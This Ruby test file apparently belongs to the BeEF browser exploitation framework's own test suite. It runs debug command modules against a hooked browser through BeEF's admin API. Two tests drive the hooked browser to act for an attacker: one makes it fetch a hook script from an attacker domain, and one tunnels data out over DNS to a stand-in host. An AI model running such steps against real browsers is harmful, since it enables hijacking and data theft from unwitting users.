#
# Copyright (c) 2006-2020 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#

require 'rest-client'
require 'json'
require_relative '../../../support/constants'
require_relative '../../../support/beef_test'

RSpec.describe 'BeEF Debug Command Modules:' do

    before(:each) do
        # Grab config and set creds in variables for ease of access
        @config = BeEF::Core::Configuration.instance
        @username = @config.get('beef.credentials.user')
        @password = @config.get('beef.credentials.passwd')

        # Authenticate to RESTful API endpoint to generate token for future tests
        response = RestClient.post "#{RESTAPI_ADMIN}/login",
                                   { 'username': "#{@username}",
                                     'password': "#{@password}" }.to_json,
                                   :content_type => :json
        @token = JSON.parse(response)['token']
        hooks = RestClient.get "#{RESTAPI_HOOKS}?token=#{@token}"
        @session = JSON.parse(hooks)['hooked-browsers']['online']['0']['session']
    end

    describe 'Test_beef.debug() command module' do
        it 'successfully executes' do
            response = RestClient.post "#{RESTAPI_MODULES}/#{@session}/27?token=#{@token}",
                                    { "msg": "Testing Test_beef.debug() command module" }.to_json,
                                    :content_type => :json
            result_data = JSON.parse(response.body)
            expect(result_data['success']).to eq "true"
        end
    end

    describe 'Return ASCII Characters command module' do
        it 'successfully executes' do
            response = RestClient.post "#{RESTAPI_MODULES}/#{@session}/25?token=#{@token}",
                                    { }.to_json,
                                    :content_type => :json
            result_data = JSON.parse(response.body)
            expect(result_data['success']).to eq "true"    
        end
    end

    describe 'Return Image command module' do
        it "successfully executes" do
            response = RestClient.post "#{RESTAPI_MODULES}/#{@session}/22?token=#{@token}",
                                    { }.to_json,
                                    :content_type => :json
            result_data = JSON.parse(response.body)
            expect(result_data['success']).to eq "true"
        end
    end

    describe "Test HTTP Redirect command module" do
        before(:each) do
            response = RestClient.post "#{RESTAPI_MODULES}/#{@session}/24?token=#{@token}",
                                    { }.to_json,
                                    :content_type => :json
            result_data = JSON.parse(response.body)
            expect(result_data['success']).to eq "true"
        end

        it 'is successfully redirected to the specified URL' do
            redirect_response = RestClient.get "http://#{ATTACK_DOMAIN}:3000/redirect"
            expect(redirect_response.request.url).to eq "https://beefproject.com/"
        end
    end

    describe "Test Returning Results/Long String command module" do
        it "successfully executes" do
            response = RestClient.post "#{RESTAPI_MODULES}/#{@session}/29?token=#{@token}",
                                    { "repeat": 20,
                                    "repeat_string": "beef" }.to_json,
                                    :content_type => :json
            result_data = JSON.parse(response.body)
            expect(result_data['success']).to eq "true"
        end
    end

    describe "Test Network Request command module" do
        it "successfully executes" do
            response = RestClient.post "#{RESTAPI_MODULES}/#{@session}/29?token=#{@token}",
                                    { "scheme": "http",
                                        "method": "GET",
                                        "domain": "#{ATTACK_DOMAIN}",
                                        "port": "#{@config.get('beef.http.port')}",
                                        "path": "/hook.js",
                                        "anchor": "anchor",
                                        "data": "query=testquerydata",
                                        "timeout": "10",
                                        "dataType": "script" }.to_json,
                                        :content_type => :json
            result_data = JSON.parse(response.body)
            expect(result_data['success']).to eq "true"
        end
    end

    describe "Test DNS Tunnel command module" do
        it "successfully executes" do
            response = RestClient.post "#{RESTAPI_MODULES}/#{@session}/26?token=#{@token}",
                                    { "domain": "example.com",
                                        "data": "Lorem ipsum" }.to_json,
                                    :content_type => :json
            result_data = JSON.parse(response.body)
            expect(result_data['success']).to eq "true"
        end
    end

    describe "Test CORS Request command module" do
        it "successfully executes" do
            response = RestClient.post "#{RESTAPI_MODULES}/#{@session}/30?token=#{@token}",
                                    { "method": "GET",
                                        "url": "example.com",
                                        "data": {
                                            "test": "data"
                                        }}.to_json,
                                        content_type: :json
            result_data = JSON.parse(response.body)
            expect(result_data['success']).to eq "true"
        end
    end
end